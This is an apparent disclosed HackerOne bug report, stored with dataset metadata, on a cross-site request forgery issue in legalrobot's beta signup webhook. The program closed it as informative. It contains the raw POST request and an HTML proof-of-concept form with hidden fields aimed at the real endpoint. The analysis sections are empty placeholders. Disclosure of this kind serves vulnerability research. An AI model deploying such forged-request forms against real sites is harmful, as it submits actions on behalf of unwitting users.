---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '166231'
original_report_id: '166231'
title: CSRF Issue
weakness: Cross-Site Request Forgery (CSRF)
team_handle: legalrobot
created_at: '2016-09-06T19:00:08.144Z'
disclosed_at: '2017-08-27T18:16:52.933Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 0
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF Issue

## Metadata

- HackerOne Report ID: 166231
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: legalrobot
- Disclosed At: 2017-08-27T18:16:52.933Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Found CSRF Issue in https://www.legalrobot.com/beta/nl/

POST Request : 

POST /webhooks/beta HTTP/1.1
Host: app.legalrobot.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://www.legalrobot.com/beta/nl/
Content-Length: 107
origin: https://www.legalrobot.com
Connection: close

firstName=jdsfkds&lastName=dskfdsj&position=sdkdsj&company=skdjf&email=heeraj123%40gmail.com&language=Dutch


Attacker can implement a form such as the below one for intiating attack:
<body>
    <form action="https://app.legalrobot.com/webhooks/beta" method="POST">
      <input type="hidden" name="firstName" value="jdsfkds" />
      <input type="hidden" name="lastName" value="dskfdsj" />
      <input type="hidden" name="position" value="sdkdsj" />
      <input type="hidden" name="company" value="skdjf" />
      <input type="hidden" name="email" value="heeraj123&#64;gmail&#46;com" />
      <input type="hidden" name="language" value="Dutch" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Reference:
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
